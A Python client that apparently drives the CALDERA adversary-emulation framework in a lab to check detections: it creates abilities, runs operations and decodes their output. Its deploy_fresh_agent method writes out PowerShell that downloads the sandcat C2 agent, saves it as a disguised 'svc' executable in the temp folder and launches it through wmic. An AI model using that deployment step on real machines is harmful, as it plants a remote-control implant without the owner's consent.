# rules/engine/caldera_client.py
"""One CALDERA API client + agent lifecycle, ported from run_caldera.py.

The HTTP transport is injectable (defaults to urllib.request) so `api` is
unit-testable offline. Never logs a secret value (only method/endpoint on error).
"""
import base64, json, time, logging
import urllib.request, urllib.error
from datetime import datetime, timezone
from result import make_result
from config import subst

log = logging.getLogger("engine.caldera")

STATUS_MAP = {-3: "VISIBLE", -2: "QUEUED", -1: "PENDING", 0: "SUCCESS", 1: "FAILURE", 124: "TIMEOUT"}


def _decode_bytes(raw):
    """CALDERA output bytes to text. PowerShell on Windows emits UTF-16LE."""
    if raw.startswith(b"\xef\xbb\xbf"):
        raw = raw[3:]
    if raw.startswith(b"\xff\xfe"):
        return raw[2:].decode("utf-16-le", errors="replace").rstrip("\x00")
    try:
        text = raw.decode("utf-8")
        if "\x00" not in text:
            return text
    except UnicodeDecodeError:
        pass
    try:
        return raw.decode("utf-16-le", errors="replace").rstrip("\x00")
    except Exception:
        return raw.decode("latin-1", errors="replace")


def _utcnow_iso():
    return datetime.now(timezone.utc).isoformat()


class CalderaClient:
    def __init__(self, cfg, http=urllib.request):
        self.cfg = cfg
        self.http = http

    def api(self, method, endpoint, data=None):
        url = f"{self.cfg['server']}{endpoint}"
        body = json.dumps(data).encode() if data else None
        req = self.http.Request(url, data=body, method=method)
        req.add_header("KEY", self.cfg["api_key"])
        if body:
            req.add_header("Content-Type", "application/json")
        try:
            with self.http.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read() or b"{}")
        except urllib.error.HTTPError as e:
            log.warning("API ERROR %d: %s %s", e.code, method, endpoint)
            return {}
        except Exception as e:
            log.warning("API ERROR: %s %s %s", e, method, endpoint)
            return {}

    def create_ability(self, usecase):
        """Build one CALDERA ability from params.shell/params.command.

        The ability name is the use-case id so cleanup-by-prefix (run.py) finds it.
        """
        p = usecase["params"]
        command = subst(p["command"], self.cfg)
        cleanup = subst(usecase.get("cleanup"), self.cfg)
        result = self.api("POST", "/api/v2/abilities", {
            "name": usecase["id"],
            "description": usecase.get("description") or usecase.get("title", ""),
            "tactic": usecase.get("tactic", ""),
            "technique_id": usecase.get("technique", ""),
            "technique_name": usecase.get("technique_name") or usecase.get("title", ""),
            "executors": [{
                "platform": p.get("platform", "windows"),
                "name": p["shell"],
                "command": command,
                "payloads": [],
                "cleanup": [cleanup] if cleanup else [],
            }],
            "singleton": False,
        })
        return result.get("ability_id")

    # ALIVE MEANS BEACONING, NOT MERELY LISTED. `trusted` is not a liveness signal:
    # CALDERA's untrusted_timer is 300 s (set in deploy_fresh_agent), so an agent
    # that died seconds ago stays `trusted` for five more minutes. The second pass
    # below used to `return alive[0]` with no age test at all, so any record inside
    # that window answered "alive" over a process that no longer exists.
    #
    # Measured 2026-07-29, live: PREPARE recycled the lab, the agent died with the
    # box, `--ensure-agent` reported `already_alive: true` about a record 190 s
    # stale, no redeploy was attempted, and the gate sat on sandcat_beacon=1020 for
    # the full 900 s window. The nightly's own repair action declined to repair,
    # which is the same shape as the 2026-07-28 bug where the repair action was
    # unreachable - a rail that cannot come good is worse than a rail that is red.
    #
    # A cold boot hid it: an overnight-off box leaves the agent long past the 300 s
    # timer, so it is untrusted, filtered out, and the redeploy runs. Only the
    # dead-but-still-trusted window between ~30 s and 300 s was affected, which is
    # precisely the window a recycle lands in.
    AGENT_ALIVE_MAX_AGE_S = 30

    def _beaconing(self, agents):
        alive = [a for a in agents if a.get("trusted") and a.get("group") == self.cfg["group"]]
        for a in alive:
            last = a.get("last_seen", "")
            if not last:
                continue
            try:
                seen = datetime.fromisoformat(last.replace("Z", "+00:00").split("+")[0])
                age = (datetime.now(timezone.utc).replace(tzinfo=None) - seen).total_seconds()
                if age < self.AGENT_ALIVE_MAX_AGE_S:
                    return a
            except Exception:
                # An unparseable timestamp is not evidence of death, and refusing to
                # deploy over it would be worse than deploying twice.
                return a
        return None

    def is_agent_alive(self):
        agents = self.api("GET", "/api/v2/agents")
        if not [a for a in agents if a.get("trusted") and a.get("group") == self.cfg["group"]]:
            return None
        found = self._beaconing(agents)
        if found:
            return found
        # Second look, same test. One missed beacon is not a dead agent - the sleep
        # interval is 2-3 s - but the answer still has to be "is it beaconing", not
        # "is it listed".
        time.sleep(5)
        return self._beaconing(self.api("GET", "/api/v2/agents"))

    def deploy_fresh_agent(self, session):
        session.run_ps(
            "Get-Process | Where-Object { $_.ProcessName -like 'svc*' -and $_.ProcessName -ne 'svchost' } | "
            "Stop-Process -Force -EA SilentlyContinue"
        )
        time.sleep(2)
        for a in self.api("GET", "/api/v2/agents"):
            self.api("DELETE", f"/api/v2/agents/{a['paw']}")
        self.api("PATCH", "/api/v2/config/agents", {"sleep_min": 2, "sleep_max": 3, "untrusted_timer": 300})
        r = session.run_ps(
            f'$r = (Get-Random -Maximum 99999).ToString(); '
            f'$p = "$env:temp\\svc$r.exe"; '
            f'$wc = New-Object System.Net.WebClient; '
            f'$wc.Headers.add("platform", "windows"); '
            f'$wc.Headers.add("file", "sandcat.go"); '
            f'$wc.DownloadFile("{self.cfg["server"]}/file/download", $p); '
            f'Write-Output "$p"'
        )
        agent_path = r.std_out.decode("utf-8", errors="replace").strip()
        if not agent_path or "exe" not in agent_path.lower():
            return False
        cmd = f'wmic process call create "{agent_path} -server {self.cfg["server"]} -group {self.cfg["group"]}"'
        r2 = session.run_cmd('cmd', ['/c', cmd])
        if "ReturnValue = 0" not in r2.std_out.decode("utf-8", errors="replace"):
            return False
        start = time.time()
        while time.time() - start < 20:
            agents = self.api("GET", "/api/v2/agents")
            if any(a.get("trusted") and a.get("group") == self.cfg["group"] for a in agents):
                return True
            time.sleep(2)
        return False

    def link_output(self, op_id, link_id):
        """The command's ACTUAL stdout, and never an exception.

        `link['output']` is NOT the output. It is CALDERA v4's boolean "was output
        collected" flag, serialised as the string 'True' - confirmed against the lab
        server 2026-07-28. The engine read that field, so every caldera_command
        result in the ledger carried output='True' and a use-case whose payload
        silently no-opped looked exactly like one that attacked.

        That cost real verdicts. Two of 2026-07-28's three MISSED rows were attacks
        that never happened - the Defender-tamper registry write produced zero
        registry telemetry all day, and the LSASS use-case never made lsass load
        anything - and both were reported as detection failures because nothing in
        the record could contradict them. A loop built to make silent failures
        visible cannot itself discard the one field that would show them.

        The real output is base64 of a {"stdout","stderr","exit_code"} envelope.
        Failures are RETURNED as text, never raised: this runs inside detonation,
        and losing the night over a diagnostic read would be the worse trade.
        """
        try:
            res = self.api("GET", f"/api/v2/operations/{op_id}/links/{link_id}/result")
        except Exception as e:
            return f"<output unavailable: {e}>"
        blob = res.get("result") if isinstance(res, dict) else None
        if not blob:
            return "<no result recorded for this link>"
        try:
            raw = base64.b64decode(blob)
        except Exception as e:
            return f"<output undecodable: {e}>"
        text = _decode_bytes(raw)
        try:
            doc = json.loads(text)
        except Exception:
            # Older CALDERA base64s the raw output rather than a JSON envelope.
            return text.strip()
        if not isinstance(doc, dict):
            return text.strip()
        parts = [str(doc.get("stdout") or "").strip()]
        stderr = str(doc.get("stderr") or "").strip()
        if stderr:
            parts.append(f"stderr: {stderr}")
        code = str(doc.get("exit_code") or "").strip()
        # Only when it is NOT success: an exit code on every row is noise, and the
        # interesting case is the payload that failed while exiting 0 anyway.
        if code and code != "0":
            parts.append(f"exit_code: {code}")
        return "\n".join(p for p in parts if p)

    def ensure_agent(self, session):
        if self.is_agent_alive():
            return True
        log.warning("Agent dead - redeploying...")
        ok = self.deploy_fresh_agent(session)
        log.info("Agent redeploy: %s", "OK" if ok else "FAILED")
        return ok

    def run_ability(self, ability_id, usecase, session):
        """CALDERA-agent leg: adversary -> operation -> poll -> Result.

        Stamps attack_start/attack_end (UTC ISO) around the detonation so the
        verifier can compute detection latency and never misattribute an older alert.
        """
        if not self.ensure_agent(session):
            return make_result(usecase, "NO_AGENT", False)
        adv = self.api("POST", "/api/v2/adversaries", {
            "name": usecase["id"],
            "description": usecase.get("description") or usecase.get("title", ""),
            "atomic_ordering": [ability_id],
        })
        adv_id = adv.get("adversary_id")
        if not adv_id:
            return make_result(usecase, "SETUP_FAIL", False)
        attack_start = _utcnow_iso()
        op = self.api("POST", "/api/v2/operations", {
            "name": usecase["id"],
            "adversary": {"adversary_id": adv_id},
            "group": self.cfg["group"], "auto_close": True, "state": "running",
            "planner": {"id": self.cfg["planner_id"]}, "obfuscator": "plain-text", "jitter": "2/5",
        })
        op_id = op.get("id")
        if not op_id:
            self.api("DELETE", f"/api/v2/adversaries/{adv_id}")
            return make_result(usecase, "LAUNCH_FAIL", False,
                               attack_start=attack_start, attack_end=_utcnow_iso())
        start = time.time()
        while time.time() - start < 60:
            time.sleep(3)
            o = self.api("GET", f"/api/v2/operations/{op_id}")
            chain = o.get("chain", [])
            if chain and chain[0].get("status", -99) >= 0:
                break
            if o.get("state") == "finished":
                break
        o = self.api("GET", f"/api/v2/operations/{op_id}")
        chain = o.get("chain", [])
        attack_end = _utcnow_iso()
        # BEFORE the deletes below, or the result endpoint has nothing to answer
        # with: the operation is removed two lines down and its links go with it.
        out = ""
        if chain and chain[0].get("id"):
            out = self.link_output(op_id, chain[0]["id"])
        self.api("DELETE", f"/api/v2/adversaries/{adv_id}")
        if op_id:
            self.api("DELETE", f"/api/v2/operations/{op_id}")
        cleanup_cmd = subst(usecase.get("cleanup", ""), self.cfg)
        if cleanup_cmd and session:
            try:
                session.run_ps(cleanup_cmd)
            except Exception:
                pass  # best-effort; the ability's own cleanup may have handled it
        if not chain:
            return make_result(usecase, "NO_EXECUTION", False, op_id=op_id,
                               attack_start=attack_start, attack_end=attack_end)
        status_code = chain[0].get("status", -99)
        return make_result(usecase, STATUS_MAP.get(status_code, str(status_code)),
                           status_code >= 0, op_id=op_id,
                           attack_start=attack_start, attack_end=attack_end, output=out)
